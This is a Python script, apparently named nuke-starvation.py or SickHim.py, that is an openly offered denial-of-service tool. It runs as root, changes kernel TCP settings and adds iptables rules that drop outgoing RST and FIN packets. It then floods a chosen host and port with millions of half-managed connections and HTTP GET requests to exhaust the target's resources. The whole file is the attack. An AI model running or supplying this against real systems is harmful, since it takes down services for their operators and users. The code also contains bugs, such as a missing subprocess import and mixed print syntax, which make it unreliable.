# nuke-starvation.py
# by dj.thd <https://github.com/dj-thd>

import socket, select, sys, os

# Global variables filled with argv parameters
host = None
port = None
ip = None

# Exit and print code
def exit(code):
    print("[+] Exiting With Code %d...") % (code)
    sys.exit(code)

# Get parameters
try:
    host = sys.argv[1]
    port = int(sys.argv[2])
except:
    print("[+] ! Error : Invalid Arguments")
    print "         Usage : SickHim.py <IP / Host> <Port>"
    exit(3)

print("[+] Running SickHim.py...")

# Detect platform and do not run on other than Linux
try:
    import platform
    currentPlatform = platform.system()
    if currentPlatform != "Linux":
        print("[+] ! Error : Your Detected Platform İs %s , But This Script Will Only Work Under Linux") % (currentPlatform)
        exit(3)
except:
    print("[+] ! Error : You Dont Have 'Platform' Module İnstalled , So We Cant Detect İf You Are Running Linux")
    print "         This Script Will Try To Continue , But Will Only Work Under Linux"
    pass

# Check root
if os.geteuid() != 0:
    print("[+] ! Error : This Script Requires Running As Root To Manipulate İptables And Kernel Flags")
    exit(3)

# Resolve host
try:
    print("[+] Resolving ip of host %s...") % (host)
    ip = socket.gethostbyname(host)
except Exception as e:
    print("[+] ! Error: Could Not Resolve '%s': %s %s") % (host, type(e).__name__, e.message)
    exit(3)

print("[+] Target IP Is : %s") % (ip)

# Helper variables
savedFlags = {}
connectionsPerWorker = 5000000
threads = []
finish = False

kernelFlags = {
    "fs.file-max": 1000000,
    "net.ipv4.tcp_fin_timeout": 1,
    "net.ipv4.tcp_orphan_retries": 1,
    "net.ipv4.tcp_tw_reuse": 1,
    "net.ipv4.tcp_no_metrics_save": 1,
    "net.ipv4.tcp_sack": 0,
    "net.ipv4.tcp_dsack": 0,
    "net.ipv4.tcp_retries2": 1,
    "net.ipv4.tcp_reordering": 15,
    "net.ipv4.tcp_max_orphans": 100000,
    "net.ipv4.ip_local_port_range": "2000 65535"
}

ipTables = [
    "PREROUTING -s %s -p tcp --sport %d -j NOTRACK" % (ip, port),
    "OUTPUT -d %s -p tcp --dport %d --tcp-flags RST RST -j DROP" % (ip, port),
    "OUTPUT -d %s -p tcp --dport %d --tcp-flags FIN FIN -j DROP" % (ip, port),
    "OUTPUT -d %s -p tcp --dport %d --tcp-flags FIN,ACK FIN,ACK -j DROP" % (ip, port),
    "OUTPUT -d %s -p tcp --dport %d -j NOTRACK" % (ip, port)
]

# Add target to iptables
def addIpTables(iptables):
    print "[+] Adding İptables For The Target..."
    for i in iptables:
        os.system("iptables -t raw -I %s 2>/dev/null" % (i))

# Remove target from iptables
def removeIpTables(iptables):
    print "[+] Removing İptables For The Target..."
    for i in iptables:
        os.system("iptables -t raw -D %s 2>/dev/null" % (i))

# Get kernel flags
def getKernelFlags(flags):
    print "[+] Getting Kernel Flags"
    result = {}
    for flag in flags:
        try:
            result[flag] = subprocess.run(["sysctl", str(flag)], capture_output=True).split("=")[-1]
        except:
            result[flag] = None
    return result

# Set kernel flags
def setKernelFlags(flags):
    print "[+] Setting Kernel Flags"
    for flag,value in flags.items():
        try:
            subprocess.run(["sysctl", "-w", "%s=\"%s\"" % (flag, value)]);
        except:
            pass

# Signal handler
def sigHandler(signum, frame):
    print "[+] Got Signal %d!" % (signum)
    global ip
    global port
    global savedFlags
    removeIpTables(ipTables)
    setKernelFlags(savedFlags)
    exit(0)

# Add connection to epoll queue
def add_connection(epoll, connections, ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setblocking(0)
    s.connect_ex((ip, port))
    connections[s.fileno()] = s
    epoll.register(s.fileno(), select.EPOLLOUT|select.EPOLLONESHOT)

# Set rlimit
try:
    import resource
    print "[+] Setting RLimit"
    resource.setrlimit(resource.RLIMIT_NOFILE, (100000, 100000))
except:
    print "[+]! Error : Error İmporting Module 'Resource' Or Setting 'Nofile' Limit , We Will Continue Anyway (The Attack May Fail)"

# Set kernel flags
savedFlags = getKernelFlags(list(kernelFlags.keys()))
setKernelFlags(flags=kernelFlags)

# Add signal handlers
try:
    import signal
    print "[+] Adding Signal Handlers"
    signal.signal(signal.SIGINT, sigHandler)
    signal.signal(signal.SIGTERM, sigHandler)
except:
    print "[+]! Error : Error İmporting Module 'Signal' Or Adding Signal Handlers , You Must Restore İptables And Kernel Flags Yourself When The Script Finishes!!!"

# Add iptables
addIpTables(ipTables)

# Main worker function
def worker(host, ip, port, workerId):
    global connectionsPerWorker

    print "[+] Starting Epoll Worker And Enqueuing %d Connections [id=%d]..." % (connectionsPerWorker, workerId)
    epoll = select.epoll()

    connections = {}
    for i in range(1, connectionsPerWorker):
        add_connection(epoll, connections, ip, port)

    print "[+] %d Connections Added İnto Queue , Running Event Loop..." % (connectionsPerWorker)
    try:
        while True:
            events = epoll.poll(-1)
            for fileno, event in events:
                s = connections.pop(fileno)
                if(s):
                    try:
                        s.send("GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 nuke-starvation (https://github.com/dj-thd/nuke-starvation)\r\nConnection: keep-alive\r\n\r\n" % (host))
                    except:
                        pass
                    s.close()
                    add_connection(epoll, connections, ip, port)

    except Exception as e:
        print "[+] ! Error ! %s %s At Worker [id=%d]" % (type(e).__name__, e.message, workerId)

# Detect cpu count to set number of threads
numThreads = 1
try:
    import multiprocessing
    numThreads = multiprocessing.cpu_count() - 1;
except Exception as e:
    print "[+] ! Error Detecting CPU Core Count : %s %s / We Will Assume That You Have Single Core" % (type(e).__name__, e.message)
    numThreads = 1

# Detect if module threading is present
try:
    import threading
except:
    print "[+] ! Error İmporting Module 'Threading' , We Will Continue With Single Thread"
    numThreads = 1

# Detect if module time is present
try:
    import time
except:
    print "[+] ! Error İmporting Module 'Time' Needed For Sleeps İn Thread Check Loop , We Will Continue With Single Thread"
    numThreads = 1

# If running threading mode, launch threads and wait for them
if(numThreads > 1):
    print "[+] Host Has More Than 2 CPU Cores , Starting %d Threads..." % (numThreads)
    for i in range(numThreads):
        t = threading.Thread(target=worker, args=(host, ip, port, i))
        t.daemon = True
        threads.append(t)
        t.start()
    time.sleep(1)
    while threads and not finish:
        for i in threads:
            if not i.is_alive():
                print "! Some thread died"
                finish = True
                break
        time.sleep(1)
else:
    print "[+] Host Has 2 CPU Cores Or Less , Launching Attack İn Main Thread"
    worker(host, ip, port, 0)

# If we get here, the attack has finished or script has exited
print "[+] Attack Finished"
removeIpTables(ipTables)
setKernelFlags(savedFlags)
exit(0)
